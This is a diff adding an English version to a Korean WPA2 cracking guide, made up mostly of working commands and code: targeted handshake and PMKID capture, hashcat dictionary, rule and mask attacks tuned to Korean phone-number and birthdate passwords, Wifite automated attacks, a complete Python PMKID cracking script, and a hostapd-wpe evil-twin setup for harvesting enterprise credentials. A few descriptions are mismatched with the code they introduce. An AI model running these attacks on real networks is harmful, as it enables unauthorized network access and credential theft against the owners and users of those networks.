@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # WPA2 크래킹 완전 가이드
 
 ## WPA2 크랙 전략 개요
@@ -565,6 +571,579 @@ sudo apt install hostapd-wpe
 sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
 
 # 캡처된 MSCHAPv2 챌린지/응답 크래킹
+hashcat -m 5500 netntlm.txt wordlist.txt  # NTLMv1
+hashcat -m 5600 netntlmv2.txt wordlist.txt  # NTLMv2
+```
+
+---
+
+<a name="english"></a>
+
+# Complete WPA2 Cracking Guide
+
+## WPA2 Cracking Strategy Overview
+
+```
+WPA2 Cracking Methodology
+─────────────────────────────────────────
+1. Handshake Capture
+   └── Passive waiting OR Force Deauth
+
+2. PMKID Attack (no handshake needed, 2018)
+   └── Can be collected directly from AP
+
+3. Offline Cracking
+   ├── Dictionary attack (wordlist)
+   ├── Rule-based (hashcat rules)
+   ├── Mask attack (pattern-based)
+   └── Rainbow table (pmkid-cache)
+
+4. Verify password on success
+─────────────────────────────────────────
+```
+
+---
+
+## 1. WPA2 Cracking with Hashcat
+
+### Converting Handshake Files
+
+Convert handshake files in aircrack-ng format (.cap) to a format that hashcat can process, using hcxpcapngtool from hcxtools.
+
+```bash
+# aircrack-ng capture file -> hashcat format
+# Use hcxdumptool/hcxtools (recommended)
+sudo apt install hcxdumptool hcxtools
+
+# Direct capture with hcxdumptool (all APs)
+sudo hcxdumptool \
+    -i wlan0mon \
+    -o capture.pcapng \
+    --enable_status=3
+
+# Target specific AP only
+echo "AABBCCDDEEFF" > target.txt  # Target BSSID (no colons)
+sudo hcxdumptool \
+    -i wlan0mon \
+    -o capture.pcapng \
+    --filterlist_ap=target.txt \
+    --filtermode=2
+
+# Convert pcapng to hashcat format
+hcxpcapngtool capture.pcapng -o capture.hc22000
+
+# Convert existing .cap file
+hcxpcapngtool capture.cap -o capture.hc22000
+
+# Verify content
+hcxhashtool -i capture.hc22000 --info=short
+```
+
+### Hashcat WPA2 Cracking
+
+Crack WPA2 handshakes or PMKIDs using hashcat mode 22000. Combine dictionary and mask attacks with GPU acceleration for improved efficiency.
+
+```bash
+# Mode 22000 (WPA2 PMKID/handshake unified)
+# Mode 2500 (WPA2 handshake, legacy)
+
+# Dictionary attack
+hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
+
+# Rule-based attack (effective)
+hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 22000 capture.hc22000 wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
+
+# Mask attack (Korean password patterns)
+# ?d=digit, ?u=uppercase, ?l=lowercase, ?a=all characters
+hashcat -m 22000 capture.hc22000 -a 3 "?d?d?d?d?d?d?d?d"    # 8-digit number
+hashcat -m 22000 capture.hc22000 -a 3 "?l?l?l?l?d?d?d?d"    # 4 lowercase + 4 digits
+hashcat -m 22000 capture.hc22000 -a 3 "?u?l?l?l?d?d?d?d"    # mixed case + digits
+hashcat -m 22000 capture.hc22000 -a 3 "010?d?d?d?d?d?d?d?d" # phone number starting with 010
+
+# Combination attack (combine two wordlists)
+hashcat -m 22000 capture.hc22000 -a 1 wordlist1.txt wordlist2.txt
+
+# Hybrid (dictionary + mask)
+hashcat -m 22000 capture.hc22000 -a 6 wordlist.txt "?d?d?d?d"  # word + 4 digits
+
+# GPU optimization
+hashcat -m 22000 capture.hc22000 wordlist.txt \
+    -d 1 \              # Use GPU device 1
+    -w 4 \              # Workload (1=low, 4=maximum)
+    --gpu-temp-abort=90  # Stop if temperature exceeds 90°C
+
+# Save/restore session
+hashcat -m 22000 capture.hc22000 wordlist.txt --session=my_session
+hashcat -m 22000 --session=my_session --restore  # Resume
+
+# Show cracked passwords
+hashcat -m 22000 capture.hc22000 --show
+```
+
+### Cracking with Aircrack-ng
+
+Use pre-generated rainbow tables with rcrack to crack hashes. This is a time-memory trade-off approach.
+
+```bash
+# Dictionary attack
+aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
+
+# Target specific BSSID
+aircrack-ng capture-01.cap \
+    -b AA:BB:CC:DD:EE:FF \
+    -w wordlist.txt
+
+# Real-time progress check
+aircrack-ng capture-01.cap -w wordlist.txt -q
+```
+
+---
+
+## 2. PMKID Attack (2018)
+
+The PMKID attack extracts the PMKID from the AP's first EAPOL frame without requiring a client, enabling offline cracking. Capture with `hcxdumptool` and `hcxtools`, then crack with hashcat.
+
+```
+Traditional: Requires client handshake (time-consuming)
+PMKID: Can be collected with just a connection attempt to the AP
+
+PMKID = HMAC-SHA1(PMK, "PMK Name" || BSSID || Client_MAC)
+-> PMK = PBKDF2(PSK, SSID)
+-> Offline dictionary attack possible
+```
+
+The PMKID attack extracts the PMKID from the AP without client connections and cracks the WPA2 key offline. Discovered in 2018, this technique is more efficient than handshake capture.
+
+```bash
+# Collect PMKID (hcxdumptool)
+sudo hcxdumptool \
+    -i wlan0mon \
+    -o pmkid.pcapng \
+    --enable_status=3 \
+    --filterlist_ap=target.txt
+
+# Immediately verify collection
+hcxhashtool -i pmkid.pcapng --pmkid | head
+
+# Convert to hashcat format
+hcxpcapngtool pmkid.pcapng -o pmkid.hc22000
+
+# Crack
+hashcat -m 22000 pmkid.hc22000 wordlist.txt
+```
+
+---
+
+## 3. Wordlist Optimization
+
+### Effective Wordlist Construction
+
+Build effective wordlists for WPA2 cracking. Adding Korean patterns (birth dates, phone numbers, etc.) to the rockyou.txt base wordlist improves the success rate.
+
+```bash
+# Base wordlists
+/usr/share/wordlists/rockyou.txt          # 14 million entries
+/usr/share/wordlists/dirbuster/           # For web paths
+
+# Download additional wordlists
+wget https://github.com/danielmiessler/SecLists/archive/master.zip
+ls SecLists/Passwords/WiFi-WPA/
+
+# Generate Korean-specific wordlist
+# Phone number patterns
+python3 -c "
+for i in range(0, 9999):
+    print(f'010{i:08d}')
+    print(f'011{i:08d}')
+    print(f'016{i:08d}')
+" > phone_numbers.txt
+
+# Birth date patterns
+python3 -c "
+for year in range(1960, 2010):
+    for month in range(1, 13):
+        for day in range(1, 32):
+            print(f'{year}{month:02d}{day:02d}')
+" > birthdays.txt
+```
+
+### Custom hashcat Rule Files
+
+```bash
+# custom.rule - rules optimized for Korean patterns
+# Basic word transformations
+:            # keep original
+l            # all lowercase
+u            # all uppercase
+c            # capitalize first letter
+
+# Append digits
+$1           # append 1 at end
+$123         # append 123 at end
+$1234        # append 1234 at end
+$!           # append ! at end
+$@           # append @ at end
+
+# Prepend digits
+^1           # prepend 1
+
+# Append years
+$2024
+$2023
+$2022
+$2021
+$2020
+
+# Substitutions
+sa@          # replace a with @
+se3          # replace e with 3
+si1          # replace i with 1
+so0          # replace o with 0
+```
+
+```bash
+# Apply rules
+hashcat -m 22000 capture.hc22000 base_words.txt -r custom.rule
+
+# Apply multiple rules simultaneously
+hashcat -m 22000 capture.hc22000 wordlist.txt \
+    -r rule1.rule \
+    -r rule2.rule
+```
+
+---
+
+## 4. John the Ripper
+
+```bash
+# Convert handshake (aircrack format)
+# Supported in john-jumbo
+john --list=formats | grep WPA
+
+# WPA2 cracking
+wpaclean clean.cap capture-01.cap  # Extract handshake
+aircrack-ng clean.cap -J john_file  # Convert to john format
+
+john john_file.hccap --wordlist=wordlist.txt
+
+# Incremental attack
+john john_file.hccap --incremental
+
+# Mask attack
+john john_file.hccap --mask="?d?d?d?d?d?d?d?d"
+```
+
+---
+
+## 5. Wifite2 - Automated Attack
+
+Wifite2 is a tool that automates wireless attacks. It automatically scans nearby APs and performs handshake capture, WPS attacks, PMKID attacks, and more.
+
+```bash
+# Install Wifite2
+sudo apt install wifite
+
+# Full automated attack
+sudo wifite
+
+# Target specific BSSID
+sudo wifite --bssid AA:BB:CC:DD:EE:FF
+
+# Specify dictionary
+sudo wifite --dict /path/to/wordlist.txt
+
+# WPS attack only
+sudo wifite --wps-only
+
+# Disable deauth (quiet mode)
+sudo wifite --nodeauth
+
+# Options
+sudo wifite \
+    --kill \            # Kill interfering processes
+    --crack \           # Crack immediately after capture
+    --dict rockyou.txt
+```
+
+---
+
+## 6. Advanced: PMKID Cache Table
+
+The PMKID attack extracts the PMKID from the AP's first EAPOL frame without requiring a client, enabling offline cracking. Capture with `hcxdumptool` and `hcxtools`, then crack with hashcat.
+
+```python
+#!/usr/bin/env python3
+"""
+PMKID/WPA2 handshake offline cracking tool (for educational/CTF purposes)
+Usage: python3 pmkid_crack.py --ssid MyWiFi --pmkid d6fd... --ap-mac AA:BB --client-mac 11:22 --wordlist rockyou.txt
+"""
+
+from __future__ import annotations
+
+import argparse
+import hashlib
+import hmac
+import multiprocessing
+import sys
+import time
+from dataclasses import dataclass
+from pathlib import Path
+from typing import Optional
+
+
+# ------------------------------------------------------------------ #
+#  WPA2 cryptographic functions
+# ------------------------------------------------------------------ #
+def compute_pmk(password: str, ssid: str) -> bytes:
+    """PMK = PBKDF2-HMAC-SHA1(password, ssid, 4096 rounds, 32 bytes)"""
+    return hashlib.pbkdf2_hmac(
+        "sha1",
+        password.encode("utf-8", errors="replace"),
+        ssid.encode("utf-8", errors="replace"),
+        4096,
+        32,
+    )
+
+
+def compute_pmkid(pmk: bytes, ap_mac_hex: str, client_mac_hex: str) -> str:
+    """
+    PMKID = HMAC-SHA1(PMK, b'PMK Name' || AP_MAC_bytes || Client_MAC_bytes)[:16]
+    """
+    ap_bytes = bytes.fromhex(ap_mac_hex.replace(":", "").replace("-", ""))
+    client_bytes = bytes.fromhex(client_mac_hex.replace(":", "").replace("-", ""))
+    data = b"PMK Name" + ap_bytes + client_bytes
+    digest = hmac.new(pmk, data, hashlib.sha1).digest()
+    return digest[:16].hex()
+
+
+def compute_mic(pmk: bytes, ap_nonce: bytes, client_nonce: bytes,
+                ap_mac: bytes, client_mac: bytes, eapol_data: bytes) -> str:
+    """
+    Compute MIC after PTK derivation (for 4-Way Handshake verification)
+    PTK = PRF-512(PMK, 'Pairwise key expansion' || min/max(macs) || min/max(nonces))
+    """
+    # PTK derivation (802.11i PRF-512)
+    def prf512(key: bytes, a: bytes, b: bytes) -> bytes:
+        result = b""
+        for i in range(4):
+            result += hmac.new(key, a + b"\x00" + b + bytes([i]), hashlib.sha1).digest()
+        return result[:64]
+
+    min_mac = min(ap_mac, client_mac)
+    max_mac = max(ap_mac, client_mac)
+    min_nonce = min(ap_nonce, client_nonce)
+    max_nonce = max(ap_nonce, client_nonce)
+
+    ptk = prf512(
+        pmk,
+        b"Pairwise key expansion",
+        min_mac + max_mac + min_nonce + max_nonce,
+    )
+    kck = ptk[:16]   # Key Confirmation Key
+    mic = hmac.new(kck, eapol_data, hashlib.md5).hexdigest()
+    return mic
+
+
+# ------------------------------------------------------------------ #
+#  Cracking worker (for multiprocessing)
+# ------------------------------------------------------------------ #
+def _crack_worker(
+    chunk: list[str],
+    ssid: str,
+    target_pmkid: str,
+    ap_mac: str,
+    client_mac: str,
+    result_queue: multiprocessing.Queue,
+) -> None:
+    for password in chunk:
+        password = password.strip()
+        if not password:
+            continue
+        try:
+            pmk = compute_pmk(password, ssid)
+            computed = compute_pmkid(pmk, ap_mac, client_mac)
+            if computed == target_pmkid.lower():
+                result_queue.put(("found", password))
+                return
+        except Exception:
+            continue
+    result_queue.put(("done", None))
+
+
+# ------------------------------------------------------------------ #
+#  Main cracker class
+# ------------------------------------------------------------------ #
+@dataclass
+class PMKIDCracker:
+    ssid: str
+    target_pmkid: str
+    ap_mac: str
+    client_mac: str
+    wordlist: str
+    workers: int = multiprocessing.cpu_count()
+
+    def crack(self) -> Optional[str]:
+        wl_path = Path(self.wordlist)
+        if not wl_path.exists():
+            print(f"[-] Wordlist not found: {wl_path}", file=sys.stderr)
+            return None
+
+        # Load entire wordlist (chunk processing for large files)
+        print(f"[*] Loading wordlist: {wl_path}", file=sys.stderr)
+        try:
+            with open(wl_path, encoding="latin-1", errors="replace") as fh:
+                words = fh.readlines()
+        except OSError as exc:
+            print(f"[-] File read failed: {exc}", file=sys.stderr)
+            return None
+
+        total = len(words)
+        print(f"[*] {total:,} words | Processes: {self.workers}", file=sys.stderr)
+        print(f"[*] Target PMKID: {self.target_pmkid}", file=sys.stderr)
+        print(f"[*] SSID: {self.ssid}  AP: {self.ap_mac}  Client: {self.client_mac}", file=sys.stderr)
+
+        chunk_size = max(1, total // self.workers)
+        chunks = [words[i : i + chunk_size] for i in range(0, total, chunk_size)]
+
+        result_queue: multiprocessing.Queue = multiprocessing.Queue()
+        processes = []
+        for chunk in chunks:
+            p = multiprocessing.Process(
+                target=_crack_worker,
+                args=(chunk, self.ssid, self.target_pmkid, self.ap_mac, self.client_mac, result_queue),
+            )
+            p.start()
+            processes.append(p)
+
+        start = time.time()
+        found_pw: Optional[str] = None
+        done_count = 0
+
+        while done_count < len(processes):
+            msg_type, value = result_queue.get()
+            if msg_type == "found":
+                found_pw = value
+                for p in processes:
+                    p.terminate()
+                break
+            else:
+                done_count += 1
+
+        for p in processes:
+            p.join()
+
+        elapsed = time.time() - start
+
+        if found_pw:
+            rate = total / elapsed if elapsed > 0 else 0
+            print(f"\n[+] Password found: {found_pw}")
+            print(f"[+] Elapsed: {elapsed:.1f}s  Speed: {rate:,.0f} PMK/s")
+        else:
+            print(f"\n[-] Password not found. ({elapsed:.1f}s / {total:,} attempts)")
+
+        return found_pw
+
+
+# ------------------------------------------------------------------ #
+#  CLI
+# ------------------------------------------------------------------ #
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description="PMKID/WPA2 handshake offline cracking tool (for educational/CTF purposes)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="Examples:\n"
+               "  python3 pmkid_crack.py \\\n"
+               "    --ssid MyWiFi \\\n"
+               "    --pmkid d6fd3e50a1234567890abcdef1234567 \\\n"
+               "    --ap-mac AA:BB:CC:DD:EE:FF \\\n"
+               "    --client-mac 11:22:33:44:55:66 \\\n"
+               "    --wordlist /usr/share/wordlists/rockyou.txt",
+    )
+    parser.add_argument("--ssid",       required=True, help="Target SSID")
+    parser.add_argument("--pmkid",      required=True, help="Collected PMKID (32-char hex)")
+    parser.add_argument("--ap-mac",     required=True, help="AP BSSID (AA:BB:CC:DD:EE:FF)")
+    parser.add_argument("--client-mac", required=True, help="Client MAC address")
+    parser.add_argument("--wordlist",   required=True, metavar="FILE", help="Wordlist file")
+    parser.add_argument(
+        "--workers", type=int, default=multiprocessing.cpu_count(),
+        help=f"Number of parallel processes (default: {multiprocessing.cpu_count()})",
+    )
+    return parser
+
+
+def main() -> None:
+    parser = build_parser()
+    args = parser.parse_args()
+
+    if len(args.pmkid) != 32:
+        parser.error("PMKID must be a 32-character hex string")
+
+    cracker = PMKIDCracker(
+        ssid=args.ssid,
+        target_pmkid=args.pmkid,
+        ap_mac=args.ap_mac,
+        client_mac=args.client_mac,
+        wordlist=args.wordlist,
+        workers=args.workers,
+    )
+    cracker.crack()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 7. Performance Benchmarks
+
+Measure GPU performance with hashcat benchmarks. Check hashes per second (H/s) in WPA2 mode to estimate cracking time.
+
+```bash
+# hashcat performance test
+hashcat -b -m 22000
+
+# Typical performance (by GPU)
+# GTX 1080 Ti: ~500,000 H/s
+# RTX 3090:    ~750,000 H/s
+# RTX 4090:    ~1,100,000 H/s
+
+# Estimated cracking time for rockyou.txt (14M)
+# RTX 3090: ~19 seconds (dictionary)
+# All 8-digit numbers: 100,000,000 / 750,000 = ~133 seconds
+
+# Cloud cracking (AWS)
+# p3.2xlarge (V100): ~400,000 H/s
+# Cost: approximately $3/hour
+
+# Distributed cracking (Hashtopolis)
+# Link multiple GPU servers
+# docker run hashtopolis/hashtopolis
+```
+
+---
+
+## 8. WPA Enterprise (802.1X) Attacks
+
+Capture PEAP/MSCHAPv2 credentials in WPA Enterprise (802.1X) environments. Run a rogue RADIUS server with hostapd-wpe to intercept credentials.
+
+```bash
+# Capture and crack PEAP/MSCHAPv2
+# Collect EAP authentication packets
+sudo airodump-ng wlan0mon --write enterprise_capture
+
+# Crack MSCHAPv2 with asleap
+asleap -r enterprise_capture-01.cap \
+       -W wordlist.txt
+
+# hostapd-wpe (WPA Enterprise Evil Twin)
+# Rogue RADIUS server for credential collection
+sudo apt install hostapd-wpe
+# After configuring /etc/hostapd-wpe/hostapd-wpe.conf:
+sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+
+# Crack captured MSCHAPv2 challenge/response
 hashcat -m 5500 netntlm.txt wordlist.txt  # NTLMv1
 hashcat -m 5600 netntlmv2.txt wordlist.txt  # NTLMv2
 ```
